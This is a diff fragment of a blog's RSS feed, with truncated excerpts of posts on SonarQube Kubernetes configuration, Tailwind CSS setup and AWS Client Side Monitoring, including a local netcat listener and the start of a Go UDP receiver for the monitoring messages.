+Adjust the resources request and limit 1resources: 2 limits: 3 cpu: &amp;#39;1&amp;#39; 4 memory: 8Gi 5 requests: 6 cpu: 400m 7 memory: 4Gi Change the securityContext to debug the pod and install some tools to check 1securityContext: 2 runAsUser: 0 3 runAsGroup: 0 Mount the sonar.properties to specific the java launch parameters the mount and volumes 1volumes: 2 - name: sonarqube-config 3 configMap: 4 name: sonarqube-sonarqube-config 5 defaultMode: 420 6volumeMounts: 7- name: sonarqube-config 8 mountPath: /opt/sonarqube/conf the configmap 1apiVersion: v1 2kind: ConfigMap 3metadata: 4 name: sonarqube-sonarqube-config 5 namespace: sonarqube 6data: 7 sonar.
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>Tailwindcss getting started</title>
+      <link>https://blog.wisekee.com/post/tailwindcss-getting-started/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/tailwindcss-getting-started/</guid>
+      <description>
+        
+          
+            Initialization the project 1mkdir tailwind 2cd tailwind 3pnpm create vite@latest my-project -- --template vue 4pnpm install -D tailwindcss postcss autoprefixer 5# this will create a `tailwind.config.js` `postcss.config.js` 6pnpm tailwindcss init -p 7pnpm run dev config the tailwind css project add the package to src/style.css 1@tailwind base; 2@tailwind components; 3@tailwind utilities; config the postcss.config.js 1export default { 2 plugins: { 3 tailwindcss: {}, 4 autoprefixer: {}, 5 }, 6} config the tailwind.
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>Use AWS CSM to monitoring the api call in your service</title>
+      <link>https://blog.wisekee.com/post/aws-client-side-monitoring/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/aws-client-side-monitoring/</guid>
+      <description>
+        
+          
+            Enable the aws CSM for application specific the following Environment Variables 1export AWS_CSM_ENABLED=true # or config the `~/.aws/config` include `csm_enabled = true` 2export AWS_CSM_HOST=10.0.0.1 # to send message to udp host 3export AWS_CSM_PORT=31000 # the CSM host port to listener 4export AWS_CSM_CLIENT_ID=appName # to set an identifier to differentiate multiple processes you might have configured to send to the same listener. Receive the message from client in local testing 1nc -luv localhost 31000 Receive the message from client use go code 1package main 2 3import ( 4	&amp;#34;encoding/json&amp;#34; 5	&amp;#34;fmt&amp;#34; 6	&amp;#34;log&amp;#34; 7	&amp;#34;net&amp;#34; 8	&amp;#34;os&amp;#34; 9	&amp;#34;os/signal&amp;#34; 10	&amp;#34;runtime&amp;#34; 11	&amp;#34;strconv&amp;#34; 12	&amp;#34;strings&amp;#34; 13	&amp;#34;syscall&amp;#34; 14) 15 16// ActionMessage is a struct representing a message from CSM 17type ActionMessage struct { 18	Version int `json:&amp;#34;Version&amp;#34;` 19	ClientID string `json:&amp;#34;ClientId&amp;#34;` 20	Type string `json:&amp;#34;Type&amp;#34;` 21	Service string `json:&amp;#34;Service&amp;#34;` 22	Action string `json:&amp;#34;Api&amp;#34;` 23	Timestamp int `json:&amp;#34;Timestamp&amp;#34;` 24	AttemptLatency int `json:&amp;#34;AttemptLatency&amp;#34;` 25	Fqdn string `json:&amp;#34;Fqdn&amp;#34;` 26	UserAgent string `json:&amp;#34;UserAgent&amp;#34;` 27	AccessKey string `json:&amp;#34;AccessKey&amp;#34;` 28	Region string `json:&amp;#34;Region&amp;#34;` 29	HTTPStatusCode int `json:&amp;#34;HttpStatusCode&amp;#34;` 30	FinalHTTPStatusCode int `json:&amp;#34;FinalHttpStatusCode&amp;#34;` 31	XAmzRequestID string `json:&amp;#34;XAmzRequestId&amp;#34;` 32	XAmzID2 string `json:&amp;#34;XAmzId2&amp;#34;` 33} 34 35func listen(connection *net.
+          
+          
+        
+      </description>
+    </item>
+    
+  </channel>
+</rss>
